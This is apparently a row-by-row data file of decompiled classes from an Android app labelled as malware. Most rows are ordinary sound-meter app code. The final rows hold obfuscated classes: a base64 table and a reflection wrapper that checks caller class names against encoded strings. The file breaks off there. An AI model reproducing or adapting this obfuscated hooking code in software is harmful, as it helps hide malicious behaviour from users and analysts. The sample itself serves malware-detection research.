this.f.setColor(this.c);           this.f.setTextSize(2.2f * this.T * this.H);           canvas.drawText(this.g.getString(C0000R.string.reset_msg_0),this.N - (this.f.measureText(this.g.getString(C0000R.string.reset_msg_0)) / 2.0f),(this.t.getHeight() / (this.K > 1000 ? 1.5f : 1.8f)) + this.O,this.f);           canvas.drawText(this.g.getString(C0000R.string.reset_msg_1),this.N - (this.f.measureText(this.g.getString(C0000R.string.reset_msg_1)) / 2.0f),(this.t.getHeight() / (this.K > 1000 ? 1.5f : 1.8f)) + this.O + (2.8f * this.T * this.H),this.f);           canvas.drawBitmap(this.x,this.N + ((this.t.getWidth() - this.x.getWidth()) / 2),(this.O + (this.t.getHeight() / 2)) - (this.y.getHeight() * 1.3f),(Paint)null);           canvas.drawBitmap(this.w,this.N - (this.w.getWidth() / 2),(this.K - ((this.R * this.H) * 5.0f)) - this.w.getHeight(),(Paint)null);           a();           this.f.setTextSize(this.R * 0.75f * this.H);           canvas.drawText(String.valueOf(this.r[0]) + this.s,this.J * 0.05f * this.H* this.H,this.K - ((this.R * this.H) * 4.2f),this.f);           canvas.drawText(String.valueOf(this.r[1]) + this.s,this.J * 0.45f,this.K - ((this.R * this.H) * 4.2f),this.f);           canvas.drawText(String.valueOf(this.r[2]) + this.s,(this.J * 0.95f) - (this.f.measureText(String.valueOf(this.r[2]) + this.s) * this.H),this.K - ((this.R * this.H) * 4.2f),this.f);           this.f.setColor(this.e);           this.f.setStyle(Paint.Style.STROKE);           this.f.setStrokeWidth(SmartSound.r <= 9000 ? 2 : 1);           c=this.F.c();           canvas.drawPath(c,this.f);           this.f.setStrokeWidth(1.0f);           this.f.setStyle(Paint.Style.FILL);         }  else {           canvas.drawBitmap(this.y,this.N + ((this.t.getWidth() - this.y.getWidth()) / 2),(this.O + (this.t.getHeight() / 2)) - (this.y.getHeight() * 1.3f),(Paint)null);           a(canvas);         }         canvas.drawBitmap(this.f450a.booleanValue() ? this.A : this.z,this.N - ((this.t.getWidth() + this.A.getWidth()) / 2),(this.O + (this.t.getHeight() / 2)) - (this.A.getHeight() * 1.3f),(Paint)null);       }       if (SmartSound.l) {         canvas.restore();       }     }  catch (    NullPointerException e) {       e.printStackTrace();     }   }   @Override public boolean onLongClick(  View view){     new Handler().postDelayed(new a(this),1500L);     return true;   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     int action=motionEvent.getAction();     float x=motionEvent.getX();     float y=motionEvent.getY();     if (SmartSound.o == 0 && action == 0) {       if (x > this.N - (this.v.getWidth() * 1.6f) && x < this.N + (this.v.getWidth() * 1.6f)) {         if (!SmartSound.l && y > this.O - (this.v.getHeight() * 1.6f) && y < this.O + (this.v.getHeight() * 1.6f)) {           return false;         }         if (SmartSound.l && y > ((this.K - (7.5d * this.T)) - this.O) - (this.v.getHeight() * 1.6f) && y < ((this.K - (7.5d * this.T)) - this.O) + (this.v.getHeight() * 1.6f)) {           return false;         }       }       if (!SmartSound.l && x > this.N + ((this.t.getWidth() - this.y.getWidth()) / 2) && x < this.N + ((this.t.getWidth() + this.y.getWidth()) / 2) && y > (this.O + (this.t.getHeight() / 2)) - (this.y.getHeight() * 1.2f) && y < (this.O + (this.t.getHeight() / 2)) - (this.y.getHeight() * 0.2f)) {         SmartSound.n=!SmartSound.n;         i.f();         postInvalidate();         SharedPreferences.Editor edit=PreferenceManager.getDefaultSharedPreferences(this.g).edit();         edit.putBoolean(""issoundchart"",SmartSound.n);         edit.commit();       }  else       if (SmartSound.l && x < (this.N - (this.t.getWidth() / 2)) + (this.y.getWidth() / 2) && x > (this.N - (this.t.getWidth() / 2)) - (this.y.getWidth() / 2) && y > (((this.K - (7.5d * this.T)) - this.O) - (this.t.getHeight() / 2)) + (this.y.getHeight() * 0.2f) && y < (((this.K - (7.5d * this.T)) - this.O) - (this.t.getHeight() / 2)) + (this.y.getHeight() * 1.2f)) {         SmartSound.n=!SmartSound.n;         i.f();         postInvalidate();         SharedPreferences.Editor edit2=PreferenceManager.getDefaultSharedPreferences(this.g).edit();         edit2.putBoolean(""issoundchart"",SmartSound.n);         edit2.commit();       }  else       if (!SmartSound.l && x > this.N - ((this.t.getWidth() + this.A.getWidth()) / 2) && x < this.N - ((this.t.getWidth() - this.A.getWidth()) / 2) && y > (this.O + (this.t.getHeight() / 2)) - (this.A.getHeight() * 1.2f) && y < (this.O + (this.t.getHeight() / 2)) - (this.A.getHeight() * 0.2f)) {         this.f450a=Boolean.valueOf(!this.f450a.booleanValue());         i.f();         postInvalidate();       }  else       if (SmartSound.l && x < this.N + (this.t.getWidth() / 2) + (this.A.getWidth() / 2) && x > (this.N + (this.t.getWidth() / 2)) - (this.A.getWidth() / 2) && y > (((this.K - (7.5d * this.T)) - this.O) - (this.t.getHeight() / 2)) + (this.A.getHeight() * 0.2f) && y < (((this.K - (7.5d * this.T)) - this.O) - (this.t.getHeight() / 2)) + (this.A.getHeight() * 1.2f)) {         this.f450a=Boolean.valueOf(!this.f450a.booleanValue());         i.f();         postInvalidate();       }     }     return SmartSound.o != 1 || action != 0 || x <= this.N - (((float)this.t.getWidth()) / 2.5f) || x >= this.N + (((float)this.t.getWidth()) / 2.5f) || y <= this.O - ((float)(this.t.getHeight() / 3)) || y >= this.O + ((float)(this.t.getHeight() / 3));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\d.code","class d implements View.OnClickListener {   final DialogSound f478a;   public d(  DialogSound dialogSound){     this.f478a=dialogSound;   }   @Override public void onClick(  View view){     this.f478a.a();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\DialogSound.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4bc9af2f"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\DialogVibration.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4f91335a"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\e.code","class e implements View.OnClickListener {   final DialogSound f479a;   public e(  DialogSound dialogSound){     this.f479a=dialogSound;   }   @Override public void onClick(  View view){     this.f479a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\f.code","class f implements View.OnClickListener {   final DialogVibration f480a;   public f(  DialogVibration dialogVibration){     this.f480a=dialogVibration;   }   @Override public void onClick(  View view){     this.f480a.a();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\g.code","class g implements View.OnClickListener {   final DialogVibration f481a;   public g(  DialogVibration dialogVibration){     this.f481a=dialogVibration;   }   @Override public void onClick(  View view){     this.f481a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\h.code","class h implements Runnable {   final SmartSound f482a;   public h(  SmartSound smartSound){     this.f482a=smartSound;   }   @Override public void run(){     i iVar;     Handler handler;     Runnable runnable;     try {       iVar=this.f482a.v;       iVar.c();       handler=this.f482a.t;       runnable=this.f482a.z;       handler.postDelayed(runnable,200L);     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\i.code","public class i {   private static SoundPool e;   private static int f;   private MediaRecorder f483a=null;   private j f484b=new j(this,null);   private Context c;   private CustomView d;   public i(  Context context){     this.c=context;   }   private String a(  int i){     return i < 1000 ? Integer.toString(i) : new DecimalFormat(""#,###"").format(i);   }   public static void f(){     e.play(f,0.4f,0.4f,1,0,1.0f);   }   private void g(){     this.f483a=null;     Toast.makeText(this.c,this.c.getString(C0000R.string.mic_error),1).show();   }   public void a(){     if (this.f483a == null) {       try {         this.f483a=new MediaRecorder();         this.f483a.setAudioSource(1);         this.f483a.setOutputFormat(1);         this.f483a.setAudioEncoder(1);         this.f483a.setOutputFile(""/dev/null"");         this.f483a.prepare();         this.f483a.start();       }  catch (      IOException e2) {         e2.printStackTrace();         g();       } catch (      IllegalStateException e3) {         e3.printStackTrace();         g();       } catch (      Exception e4) {         e4.printStackTrace();         g();       }     }   }   public void a(  CustomView customView){     this.d=customView;   }   public void b(){     String str=Build.MODEL;     if (this.f483a != null) {       try {         this.f483a.stop();         if (str.equals(""T-Mobile G2"") || str.equals(""HTC Desire Z"") || str.equals(""HTC Vision"")) {           this.f483a=null;         }  else {           this.f483a.release();           this.f483a=null;         }       }  catch (      IllegalStateException e2) {         e2.printStackTrace();       } catch (      Exception e3) {         e3.printStackTrace();       }     }   }   public void c(){     float d=d();     if (d > 0.0f) {       float log10=(float)(20.0d * Math.log10(d));       if (SmartSound.d > 0 && SmartSound.e != 0.0f) {         log10+=(log10 - SmartSound.d) * SmartSound.e;       }       if (SmartSound.k && DialogSound.f452a != null) {         DialogSound.f452a.setText(a((int)d));         DialogSound.f453b.setText(String.valueOf(this.c.getString(C0000R.string.sound_db2)) + "" = ("" + Integer.toString(Math.round(log10))+ (SmartSound.c >= 0 ? "" +"" : "" "")+ Integer.toString(SmartSound.c)+ "") dB"");       }       float f2=log10 + SmartSound.c;       if (this.d.f450a.booleanValue()) {         this.d.a(f2);         this.d.postInvalidate();       }     }   }   public float d(){     if (this.f483a != null) {       return j.a(this.f484b,this.f483a.getMaxAmplitude());     }     return 0.0f;   }   public void e(){     e=new SoundPool(1,3,0);     f=e.load(this.c,C0000R.raw.tick,1);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\j.code","public class j {   final int f485a;   float[] f486b;   int c;   final i d;   private j(  i iVar){     this.d=iVar;     this.f485a=4;     this.f486b=new float[4];     this.c=0;   }   public j(  i iVar,  j jVar){     this(iVar);   }   public float a(  float f){     if (f == 0.0f) {       return 0.0f;     }     this.c++;     if (this.c > this.f486b.length - 1) {       this.c=0;     }     this.f486b[this.c]=f;     float f2=0.0f;     for (    float f3 : this.f486b) {       if (f3 == 0.0f) {         f3=f;       }       f2+=f3;     }     return f2 / this.f486b.length;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\k.code","public class k {   private static final int c=100;   private Context e;   private float f;   private CustomView g;   private SoundPool h;   private int i;   private long l;   private final float f487a=129.0f;   private final int f488b=30;   private SensorManager d=null;   private final SensorEventListener j=new l(this);   private long k=System.currentTimeMillis();   private long m=0;   private final int n=50;   public k(  Context context){     this.e=context;   }   public String a(  int i){     return i < 1000 ? Integer.toString(i) : new DecimalFormat(""#,###"").format(i);   }   private void d(){     this.d=null;     Toast.makeText(this.e,this.e.getString(C0000R.string.sensor_error),1).show();   }   public void e(){     this.l=System.currentTimeMillis() - this.k;     this.k+=this.l;     this.m+=this.l;     if (this.m >= 50) {       this.h.play(this.i,1.0f,1.0f,0,0,1.0f);       this.m=0L;     }   }   public void a(){     if (this.d == null) {       this.d=(SensorManager)this.e.getSystemService(""sensor"");       List<Sensor> sensorList=this.d.getSensorList(1);       if (sensorList.size() > 0) {         this.d.registerListener(this.j,sensorList.get(0),1);       }  else {         d();       }     }   }   public void a(  CustomView customView){     this.g=customView;   }   public void b(){     if (this.d != null) {       this.d.unregisterListener(this.j);       this.d=null;     }   }   public void c(){     int[] iArr={C0000R.raw.beep1,C0000R.raw.beep2,C0000R.raw.beep3,C0000R.raw.beep4};     this.h=new SoundPool(3,3,0);     this.i=this.h.load(this.e,iArr[SmartSound.q],1);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\l.code","public class l implements SensorEventListener {   m[] f489a;   float c;   long f;   final k h;   float[] f490b=new float[3];   float d=0.0f;   long e=System.currentTimeMillis();   long g=0;   public l(  k kVar){     this.h=kVar;     this.f489a=new m[]{new m(kVar,null),new m(kVar,null),new m(kVar,null)};   }   @Override public void onAccuracyChanged(  Sensor sensor,  int i){   }   @Override public void onSensorChanged(  SensorEvent sensorEvent){     float a2;     float a3;     float a4;     float f;     float f2;     float f3;     CustomView customView;     float f4;     CustomView customView2;     float f5;     float f6;     String a5;     Context context;     float[] fArr=this.f490b;     a2=this.f489a[0].a(sensorEvent.values[0]);     fArr[0]=a2;     float[] fArr2=this.f490b;     a3=this.f489a[1].a(sensorEvent.values[1]);     fArr2[1]=a3;     float[] fArr3=this.f490b;     a4=this.f489a[2].a(sensorEvent.values[2]);     fArr3[2]=a4;     this.c=(float)Math.sqrt((this.f490b[0] * this.f490b[0]) + (this.f490b[1] * this.f490b[1]) + (this.f490b[2] * this.f490b[2]));     this.d+=this.c;     this.f=System.currentTimeMillis() - this.e;     this.e+=this.f;     this.g+=this.f;     if (this.g >= 100) {       this.h.f=(this.d * 1000.0f) / ((float)this.g);       if (SmartSound.k && DialogVibration.f454a != null) {         TextView textView=DialogVibration.f454a;         k kVar=this.h;         f6=this.h.f;         a5=kVar.a((int)f6);         textView.setText(a5);         TextView textView2=DialogVibration.f455b;         context=this.h.e;         textView2.setText(String.valueOf(context.getString(C0000R.string.vibration_db2)) + Integer.toString(SmartSound.f + 30) + "" = (""+ Integer.toString(30)+ (SmartSound.f >= 0 ? "" +"" : "" "")+ Integer.toString(SmartSound.f)+ "")"");       }       k kVar2=this.h;       f=this.h.f;       kVar2.f=((float)(Math.log10(f + 1.0f) * (SmartSound.f + 30))) + SmartSound.g;       f2=this.h.f;       if (f2 > 129.0f) {         this.h.f=129.0f;       }  else {         f3=this.h.f;         if (f3 < 0.0f) {           this.h.f=0.0f;         }       }       if (SmartSound.p > 0) {         f5=this.h.f;         if (f5 >= SmartSound.p) {           this.h.e();         }       }       customView=this.h.g;       f4=this.h.f;       customView.b(f4);       customView2=this.h.g;       customView2.postInvalidate();       this.g=0L;       this.d=(float)0;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\m.code","class m {   final int f491a;   float[] f492b;   float c;   int d;   boolean e;   final k f;   private m(  k kVar){     this.f=kVar;     this.f491a=4;     this.f492b=new float[4];     this.d=0;     this.e=true;   }   public m(  k kVar,  m mVar){     this(kVar);   }   public float a(  float f){     if (this.e) {       this.c=0.0f;       this.e=false;     }  else {       this.c=Math.abs(this.f492b[this.d] - f);     }     this.d++;     if (this.d > this.f492b.length - 1) {       this.d=0;     }     this.f492b[this.d]=f;     return this.c;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\PrefActivity.code","public class PrefActivity extends PreferenceActivity {   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     addPreferencesFromResource(C0000R.xml.settings_sound);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\SmartSound.code","!org.eclipse.jdt.core.dom.TypeDeclaration@204a8d9d"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\a.code","class a implements View.OnClickListener {   final DialogTitle f468a;   public a(  DialogTitle dialogTitle){     this.f468a=dialogTitle;   }   @Override public void onClick(  View view){     String editable=((EditText)this.f468a.findViewById(C0000R.id.sql_title)).getText().toString();     Intent intent=new Intent();     intent.putExtra(""ResultText2"",editable);     this.f468a.setResult(-1,intent);     this.f468a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\b.code","class b implements View.OnClickListener {   final DialogTitle f469a;   public b(  DialogTitle dialogTitle){     this.f469a=dialogTitle;   }   @Override public void onClick(  View view){     this.f469a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\c.code","public class c {   private final int f470a=30;   private final int f471b=100;   private final int c=0;   private final int d=120;   private int[] e;   private float[] f;   public c(){     int i=SmartSound.o == 0 ? 71 : 121;     this.e=new int[i];     this.f=new float[i];   }   public void a(){     for (int i=0; i < this.e.length; i++) {       this.e[i]=0;     }   }   public void a(  int i){     int i2;     if (SmartSound.o == 0) {       if (i > 100) {         i=100;       }  else       if (i < 30) {         i=30;       }       i2=i - 30;     }  else {       if (i > 120) {         i=120;       }       i2=i + 0;     }     int[] iArr=this.e;     iArr[i2]=iArr[i2] + 1;   }   public int[] b(){     return this.e;   }   public float[] c(){     int i=0;     for (int i2=0; i2 < this.e.length; i2++) {       i+=this.e[i2];     }     for (int i3=0; i3 < this.f.length; i3++) {       this.f[i3]=(100.0f * this.e[i3]) / i;     }     return this.f;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\ChartActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@70b9bb2b"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\ChartView.code","public class ChartView extends View {   d f465a;   float[] f466b;   int c;   float d;   float e;   private final Paint f;   private float g;   private final float h;   private int i;   private int j;   private float k;   private float l;   private float m;   private float n;   private float o;   private float p;   private final float q;   public ChartView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.g=1.0f;     this.h=1.7f;     this.q=getContext().getResources().getDisplayMetrics().densityDpi / 25.4f;     this.f=new Paint(1);   }   private void a(  Canvas canvas){     this.f.setStrokeWidth(1.0f);     this.f.setTextSize(2.2f * this.q * this.g);     int i=0;     while (true) {       int i2=i;       if (i2 >= this.c + 1) {         break;       }       if (this.c < 14 || i2 % 10 == 0) {         this.f.setColor(-7829368);         canvas.drawLine((this.k * i2) + this.n,this.o,(this.k * i2) + this.n,this.j - this.p,this.f);         this.f.setColor(ViewCompat.MEASURED_STATE_MASK);         canvas.drawText(this.f465a.d[i2],(this.n + (this.k * i2)) - (this.f.measureText(this.f465a.d[i2]) / 2.0f),(this.j - this.p) + (this.q * 2.5f * this.g),this.f);       }       i=i2 + 1;     }     if (!this.f465a.f473b.equals("""")) {       canvas.drawText(this.f465a.f473b,(this.i - this.f.measureText(this.f465a.f473b)) / 2.0f,(this.j - this.p) + (4.5f * this.q * this.g),this.f);     }     int i3=1;     while (true) {       int i4=i3;       if (i4 >= this.d + 1.0f) {         break;       }       if (this.d <= 15.0f || i4 % 5 == 0) {         this.f.setColor(-7829368);         canvas.drawLine(this.n,(this.j - this.p) - (this.l * i4),this.i - this.m,(this.j - this.p) - (this.l * i4),this.f);         this.f.setColor(ViewCompat.MEASURED_STATE_MASK);         canvas.drawText(Integer.toString(i4),(this.n - this.f.measureText(Integer.toString(i4))) - this.q,((this.j - this.p) - (this.l * i4)) + (this.q * 0.5f * this.g),this.f);       }       i3=i4 + 1;     }     if (this.f465a.c.equals("""")) {       return;     }     canvas.save();     canvas.rotate(-90.0f,this.n / 2.5f,this.j / 2);     canvas.drawText(this.f465a.c,this.n / 2.6f,(this.j / 2) + (this.q * 0.5f),this.f);     canvas.restore();   }   private void b(  Canvas canvas){     float f=this.n;     float f2=this.j - this.p;     this.f.setStrokeWidth(2.0f);     this.f.setColor(-16776961);     int i=0;     float f3=f2;     float f4=f;     boolean z=true;     while (i <= this.c) {       float f5=(((this.f466b[i] * 100.0f) / this.d) * ((this.j - this.p) - this.o)) / 100.0f;       if (this.f466b[i] == this.e && z) {         this.f.setColor(SupportMenu.CATEGORY_MASK);         this.f.setTextSize(2.5f * this.q * this.g);         canvas.drawText(this.f465a.d[i],(this.n + (this.k * i)) - (this.f.measureText(this.f465a.d[i]) / 2.0f),((this.j - this.p) - f5) - this.q,this.f);         canvas.drawLine((this.k * i) + this.n,(this.j - this.p) - f5,(this.k * i) + this.n,this.j - this.p,this.f);         this.f.setColor(-16776961);         z=false;       }       canvas.drawLine(f4,f3,this.n + (this.k * i),(this.j - this.p) - f5,this.f);       float f6=this.n + (this.k * i);       i++;       f3=(this.j - this.p) - f5;       f4=f6;       z=z;     }     this.f.setColor(ViewCompat.MEASURED_STATE_MASK);     canvas.drawLine(this.n,this.j - this.p,this.n,this.o,this.f);     canvas.drawLine(this.n,this.j - this.p,this.i - this.m,this.j - this.p,this.f);   }   private void c(  Canvas canvas){     this.f.setTextSize(3.2f * this.q * this.g);     canvas.drawText(""[ "" + this.f465a.f472a + "" ]"",(this.i - this.f.measureText(this.f465a.f472a)) / 2.0f,this.o - this.f.measureText(""M""),this.f);   }   public void a(  d dVar){     this.f465a=dVar;   }   public void a(  float[] fArr){     this.f466b=fArr;   }   @Override public void onDraw(  Canvas canvas){     this.i=Math.min(canvas.getWidth(),canvas.getHeight());     this.j=Math.max(canvas.getWidth(),canvas.getHeight());     if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT <= 13) {       this.g=1.7f;     }     this.n=7.0f * this.q * this.g;     this.m=4.0f * this.q * this.g;     this.o=this.q * 8.0f * this.g;     this.p=19.0f * this.q;     this.c=this.f465a.d.length - 1;     int length=this.f465a.d.length - 1;     while (true) {       if (length <= 0) {         break;       }       if (this.f466b[length] > 0.0f) {         this.c=length;         break;       }       length--;     }     if (this.c < 10) {       this.c+=2;     }  else {       this.c=(((this.c + 2) / 10) * 10) + 10;     }     if (this.c > this.f465a.d.length - 1) {       this.c=this.f465a.d.length - 1;     }     this.d=0.0f;     for (int i=0; i < this.f466b.length; i++) {       if (this.f466b[i] > this.d) {         float f=this.f466b[i];         this.e=f;         this.d=f;       }     }     if (this.d < 8.0f) {       this.d=10.0f;     }  else     if (this.d < 12.0f) {       this.d=15.0f;     }  else {       this.d=(((int)((this.d + 3.0f) / 10.0f)) * 10) + 10;     }     if (this.d >= 100.0f) {       this.d=100.0f;     }     this.k=((this.i - this.n) - this.m) / this.c;     this.l=((this.j - this.o) - this.p) / this.d;     a(canvas);     b(canvas);     c(canvas);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\d.code","class d {   String f472a;   String f473b;   String c;   String[] d; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\DialogTitle.code","public class DialogTitle extends Activity {   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     setContentView(C0000R.layout.dialog_title);     ((Button)findViewById(C0000R.id.button_ok)).setOnClickListener(new a(this));     ((Button)findViewById(C0000R.id.button_cancel)).setOnClickListener(new b(this));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@be0efa7"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\f.code","public class f {   protected static final String f476a=""kind"";   protected static final String f477b=""saveddate"";   protected static final String c=""title"";   protected static final String d=""memo"";   private static final String e=""chart_db"";   private static final String f=""chart_table"";   private static final int g=1;   private static final String h=""create table chart_table (_id integer primary key autoincrement, kind int,saveddate text,title text,memo text);"";   private static final String i=""drop table chart_table"";   private static SQLiteDatabase j;   public static Cursor a(  int i2){     return j.query(f,new String[]{""_id"",f477b,c},""kind = ?"",new String[]{Integer.toString(i2)},null,null,""_id DESC"");   }   public static String a(  int i2,  String str,  String str2,  String str3){     ContentValues contentValues=new ContentValues();     contentValues.put(f476a,Integer.valueOf(i2));     contentValues.put(f477b,str);     contentValues.put(c,str2);     contentValues.put(d,str3);     long insert=j.insert(f,null,contentValues);     return insert < 0 ? """" : Long.toString(insert);   }   public static void a(){     j.close();   }   public static void a(  Context context){     g gVar=new g(context);     try {       j=gVar.getWritableDatabase();     }  catch (    SQLiteException e2) {       j=gVar.getReadableDatabase();     }   }   public static void a(  String str){     j.delete(f,""_id = ?"",new String[]{str});   }   public static Cursor b(  String str){     return j.query(f,new String[]{""_id"",f477b,c,d},""_id = ?"",new String[]{str},null,null,""_id DESC"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\g.code","class g extends SQLiteOpenHelper {   public g(  Context context){     super(context,""chart_db"",(SQLiteDatabase.CursorFactory)null,1);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     sQLiteDatabase.execSQL(""create table chart_table (_id integer primary key autoincrement, kind int,saveddate text,title text,memo text);"");   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     sQLiteDatabase.execSQL(""drop table chart_table"");     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound.chart\SQLListActivity.code","public class SQLListActivity extends ListActivity implements AdapterView.OnItemClickListener, AdapterView.OnItemLongClickListener {   private SimpleCursorAdapter f467a;   private Dialog a(  long j){     CharSequence[] charSequenceArr={getString(C0000R.string.sql_load),getString(C0000R.string.sql_delete)};     AlertDialog.Builder builder=new AlertDialog.Builder(this);     builder.setTitle(getString(C0000R.string.sql_option));     builder.setItems(charSequenceArr,new e(this,j));     return builder.create();   }   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     setContentView(C0000R.layout.sql_list);     getListView().setOnItemClickListener(this);     getListView().setOnItemLongClickListener(this);   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     Intent intent=new Intent();     intent.putExtra(""ResultText1"",Long.toString(j));     setResult(-1,intent);     finish();   }   @Override public boolean onItemLongClick(  AdapterView adapterView,  View view,  int i,  long j){     a(j).show();     return false;   }   @Override protected void onPause(){     super.onPause();     f.a();   }   @Override protected void onResume(){     super.onResume();     f.a(this);     Cursor a2=f.a(SmartSound.o);     startManagingCursor(a2);     this.f467a=new SimpleCursorAdapter(this,C0000R.layout.sql_row,a2,new String[]{""saveddate"",""title""},new int[]{C0000R.id.date_text,C0000R.id.title_text});     setListAdapter(this.f467a);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\zA9nBKIBi\isdKDp9XnKb.code","class isdKDp9XnKb {   static final boolean YSHnYzCgVaTp2;   private static final byte[] f1YSHnYzCgVaTp2;   private static final byte[] rslXp2lwchKyh1OqZB; static {     YSHnYzCgVaTp2=!isdKDp9XnKb.class.desiredAssertionStatus();     f1YSHnYzCgVaTp2=new byte[]{65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     rslXp2lwchKyh1OqZB=new byte[]{-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-5,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,62,-9,-9,-9,63,52,53,54,55,56,57,58,59,60,61,-9,-9,-9,-1,-9,-9,-9,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-9,-9,-9,-9,-9,-9,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-9,-9,-9,-9,-9};   }   private isdKDp9XnKb(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\zA9nBKIBi\Jk1qej6n.code","public final class Jk1qej6n {   public static Object rWzzHNIE4Bzy8ffLjO(  Method method,  Object obj,  Object[] objArr){     String name;     String name2;     Object[] objArr2=objArr;     Object obj2=obj;     Method method2=method;     while (true) {       name=method2.getName();       name2=obj2 != null ? obj2.getClass().getName() : method2.getDeclaringClass().getName();       StackTraceElement[] stackTrace=new Throwable().getStackTrace();       StackTraceElement[] stackTraceElementArr=new StackTraceElement[stackTrace.length - 1];       System.arraycopy(stackTrace,1,stackTraceElementArr,0,stackTraceElementArr.length);       if (!name2.equals(uk7GtkPSon.WyhOMoovQIVEK(0)) && !name2.equals(uk7GtkPSon.WyhOMoovQIVEK(1)) && !name2.equals(uk7GtkPSon.WyhOMoovQIVEK(2))&& (!name2.startsWith(uk7GtkPSon.WyhOMoovQIVEK(3)) || !name2.contains(uk7GtkPSon.WyhOMoovQIVEK(4)))) {         if (!name2.contains(uk7GtkPSon.WyhOMoovQIVEK(11))) {           if (!name2.equals(uk7GtkPSon.WyhOMoovQIVEK(15))) {             if (!name2.equals(uk7GtkPSon.WyhOMoovQIVEK(18))) {               if (!name2.equals(uk7GtkPSon.WyhOMoovQIVEK(20))) {                 if (!name2.startsWith(uk7GtkPSon.WyhOMoovQIVEK(22)) || 